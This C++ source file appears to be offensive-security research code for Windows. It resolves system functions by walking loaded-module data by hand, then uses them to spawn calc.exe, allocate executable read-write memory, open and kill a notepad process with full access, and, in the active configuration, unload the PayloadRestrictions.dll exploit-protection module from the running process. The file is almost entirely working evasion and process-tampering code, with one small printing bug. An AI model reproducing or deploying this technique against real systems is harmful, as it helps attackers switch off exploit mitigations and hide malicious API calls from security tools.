#include "mem.h"
#include "pe.h"
#include "ntddk.h"



//#define calc
//#define alloc
//#define ntopen
#define ntunload

#if defined(calc) || defined(alloc)
#define modName L"kernel32.dll"
#else
#define modName L"ntdll.dll"
#endif

int main(int ) {

	void* addr = nullptr;
	LDR_DATA_TABLE_ENTRY* modEntry;
	modEntry = getModEntry(modName);
	printf("DLL baseaddr: 0x%p\n", modEntry->DllBase);

// hacky way of determining what to run
#ifdef calc
	addr = getFuncAddr(modEntry->DllBase, (char*)"WinExec");
	printf("WinExec addr: 0x%p\n", addr);

	/*
	UINT WinExec(
		LPCSTR lpCmdLine,
		UINT   uCmdShow
	*/
	typedef UINT(__stdcall* func)(LPCSTR, UINT);
	func function = (func)addr;
	function((LPCSTR)"calc.exe", (UINT)5);
#endif

#ifdef alloc
	addr = getFuncAddr(modEntry->DllBase, (char*)"VirtualAlloc");
	printf("VirtualAlloc addr: 0x%p\n", addr);

	/*
	LPVOID VirtualAlloc(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
	*/
	typedef LPVOID(__stdcall* func)(LPVOID, SIZE_T,DWORD,DWORD);
	func valloc= (func)addr;
	auto ret=valloc((LPVOID)0,(DWORD)1024,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf_s("1024 bytes allocated at 0x%p \n", ret);
#endif 

#ifdef ntopen
	addr = getFuncAddr(modEntry->DllBase, (char*)"NtOpenProcess");
	printf("NtOpenProcess addr: 0x%p\n", addr);
	/*
	__kernel_entry NTSYSCALLAPI NTSTATUS NtOpenProcess(
		PHANDLE            ProcessHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		PCLIENT_ID         ClientId
	*/
	typedef NTSTATUS(NTAPI* func)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,PCLIENT_ID);
	func ntOpen = (func)addr;

	//Get a handle (requires notepad to be opened manually)
	auto hWindow = FindWindow(L"notepad",NULL);
	if (hWindow == NULL) {
		std::cout << "Invalid handle,is notepad running?" << std::endl;
		return 1;
	}

	//Get Pid
	CLIENT_ID uPid = { NULL };
	auto ret1 = GetWindowThreadProcessId(hWindow, (PDWORD)&uPid.UniqueProcess);
	if (ret1 == NULL) {
		std::cout << "Invalid pid" << std::endl;
		return 1;
	}

	//Init OATTR to null
	OBJECT_ATTRIBUTES attribs;
	InitOA(&attribs, NULL, NULL, NULL, NULL, NULL);

	//invoke ntopenprocess
	HANDLE hProc = INVALID_HANDLE_VALUE;
	auto ret2 = ntOpen(&hProc, PROCESS_ALL_ACCESS, &attribs, &uPid);

	//lets do a noddy test
	auto ret3= TerminateProcess(hProc, 1);
	if (ret3 == 0) {
		std::cout << "something went wrong..." << std::endl;
	}
	else std::cout << "notepad shut down :)" << std::endl;
#endif

#ifdef ntunload
	addr = getFuncAddr(modEntry->DllBase, (char*)"LdrUnloadDll");
	printf("LdrUnloadDll addr: 0x%p\n", addr);
	typedef NTSTATUS(NTAPI* UNLOADDLL)(HANDLE);
	UNLOADDLL unloadDll = (UNLOADDLL)addr;


	/*
	addr = getFuncAddr(modEntry->DllBase, (char*)"LdrGetDllHandle");
	printf("LdrGetDllHandle addr: 0x%p\n", addr);
	typedef NTSTATUS(NTAPI* GETDLLHANDLE)(PWORD,PVOID,PUNICODE_STRING,OUT PHANDLE);
	GETDLLHANDLE getDllHandle = (GETDLLHANDLE)addr;

	addr = getFuncAddr(modEntry->DllBase, (char*)"RtlInitUnicodeString");
	printf("RtlInitUnicodeString addr: 0x%p\n", addr);
	typedef NTSTATUS(NTAPI* INITUNICODESTR)(PUNICODE_STRING, NTSTRSAFE_PCWSTR);
	INITUNICODESTR initUnicodeStr = (INITUNICODESTR)addr;

	UNICODE_STRING unistr;
	initUnicodeStr(&unistr, L"PayloadRestrictions.dll");
	HANDLE dllHandle;
	NTSTATUS ret = getDllHandle(NULL, NULL, &unistr, &dllHandle);
	*/

	//Turns out a handle in this case is the same as dllbase addr, so all the above code isn't needed!
	auto dllHandle = getModEntry(L"PayloadRestrictions.dll");
	printf("PayloadRestrictions.dll baseaddr: 0x%p\n", modEntry->DllBase);
	NTSTATUS ret = unloadDll((HANDLE)dllHandle->DllBase);

	printf_s("Printing module list");
	getModEntry(L"");

#endif


	printf_s("\nfunction called");
	return 0;
}
